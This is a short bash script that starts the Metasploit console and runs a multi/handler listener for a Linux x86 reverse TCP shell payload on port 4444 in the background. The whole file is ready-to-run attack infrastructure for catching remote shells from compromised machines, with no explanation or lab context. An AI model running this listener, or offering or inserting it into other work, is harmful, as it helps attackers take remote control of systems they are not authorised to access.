#!/bin/bash

echo "Starting Metasploit console..."
./msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j"
